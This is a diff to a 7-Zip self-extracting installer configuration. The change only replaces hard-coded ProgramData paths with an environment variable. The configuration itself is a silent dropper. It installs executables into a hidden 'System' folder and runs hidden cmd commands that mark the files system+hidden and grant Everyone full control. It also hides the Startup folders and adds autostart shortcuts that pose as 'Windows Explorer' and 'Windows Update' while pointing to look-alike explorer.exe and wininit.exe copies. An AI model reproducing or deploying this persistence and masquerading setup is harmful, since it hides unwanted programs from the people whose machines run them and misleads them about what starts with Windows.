@@ -1,23 +1,23 @@
 ﻿;!@Install@!UTF-8!
 
-InstallPath="C:\\ProgramData\\System"
+InstallPath="%PROGRAMDATA%\\System"
 ;silent mode no gui
 GUIMode="2"
 ;Update, if system locked, skip
 OverwriteMode="2+8"
 
 ; Hide System folder and content
-RunProgram="hidcon:cmd /c attrib +s +h c:\ProgramData\System\*.exe"
-RunProgram="hidcon:cmd /c attrib +s +h c:\ProgramData\System"
+RunProgram="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System\*.exe"
+RunProgram="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System"
 
 ;grant rights to all users
-RunProgram="hidcon:cmd /c echo y|cacls c:\ProgramData\System /t /c /p everyone:F"
+RunProgram="hidcon:cmd /c echo y|cacls %PROGRAMDATA%\System /t /c /p everyone:F"
 
 ;Start the program dont wait for its exit
 RunProgram="nowait:explorer.exe"
 
 ;Hide startup entry
-RunProgram="hidcon:cmd /c attrib +s +h \"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\""
+RunProgram="hidcon:cmd /c attrib +s +h \"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""
 
 ;Default AllUsers shortcut
 Shortcut="T,{%%T\\explorer.exe},{},{},{},{Windows Explorer},{%%T}"
@@ -27,11 +27,11 @@ Shortcut="T,{%%T\\wininit.exe},{},{},{},{Windows Update},{%%T}"
 Shortcut0="T,{%%T\\explorer.exe},{},{},{},{Windows Explorer},{%%T}"
 Shortcut0="T,{%%T\\wininit.exe},{},{},{},{Windows Update},{%%T}"
 ;Hide startup Folder All Users
-AutoInstall0="hidcon:cmd /c attrib +s +h \"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\""
+AutoInstall0="hidcon:cmd /c attrib +s +h \"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""
 ;Same as RunProgram
-AutoInstall0="hidcon:cmd /c attrib +s +h c:\ProgramData\System\*.exe"
-AutoInstall0="hidcon:cmd /c attrib +s +h c:\ProgramData\System"
-AutoInstall0="hidcon:cmd /c echo y|cacls c:\ProgramData\System /t /c /p everyone:F"
+AutoInstall0="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System\*.exe"
+AutoInstall0="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System"
+AutoInstall0="hidcon:cmd /c echo y|cacls %PROGRAMDATA%\System /t /c /p everyone:F"
 AutoInstall0="nowait:explorer.exe"
 
 ; Create shortcut at current Users Startup
@@ -40,9 +40,9 @@ Shortcut1="Tu,{%%T\\wininit.exe},{},{},{},{Windows Update},{%%T}"
 ;Hide startup Users Folder
 AutoInstall1="hidcon:cmd /c attrib +s +h \"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
 ;Same as RunProgram
-AutoInstall1="hidcon:cmd /c attrib +s +h c:\ProgramData\System\*.exe"
-AutoInstall1="hidcon:cmd /c attrib +s +h c:\ProgramData\System"
-AutoInstall1="hidcon:cmd /c echo y|cacls c:\ProgramData\System /t /c /p everyone:F"
+AutoInstall1="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System\*.exe"
+AutoInstall1="hidcon:cmd /c attrib +s +h %PROGRAMDATA%\System"
+AutoInstall1="hidcon:cmd /c echo y|cacls %PROGRAMDATA%\System /t /c /p everyone:F"
 AutoInstall1="nowait:explorer.exe"
 
 ;HKLM Startup
